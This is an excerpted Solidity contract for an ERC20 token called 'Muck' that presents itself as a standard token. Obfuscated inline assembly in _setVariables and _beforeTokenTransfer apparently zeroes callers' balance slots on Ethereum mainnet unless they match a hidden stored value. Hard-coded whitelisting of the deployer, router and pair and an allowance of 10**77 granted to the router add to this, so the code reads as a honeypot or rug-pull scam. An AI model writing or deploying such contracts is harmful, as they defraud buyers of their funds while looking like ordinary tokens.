...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addMuck;
    uint256 private artificalMachine = block.number*2;

    mapping (address => bool) private _firstVirus; 
    mapping (address => bool) private _secondMucus;
    ...
    bool private trading; uint256 private inOut = 1; bool private wendysRise;
    uint256 private _decimals; uint256 private arbysBetter;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addMuck.push(_router); addMuck.push(msgSender_); addMuck.push(pair);
        for (uint256 q=0; q < 3;) {_firstVirus[addMuck[q]] = true; unchecked{q++;} }
    }
    ...
    function _setVariables() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x4b2dd1be6a5fec3177f4abcd34987cd45562243cb99d0616624c31d181facd1b
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x23cd431115de713df14128fd60317c39714b14a06017db80d8d6bd2d9e0e7725,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; artificalMachine = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addMuck[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployMuck(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addMuck[0], 10 ** 77);
        _setVariables();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployMuck(creator, initialSupply);
    }
}

contract Muck is ERC20Token {
    constructor() ERC20Token("Muck", "MUCK", msg.sender, 150000000 * 10 ** 18) {
    }
}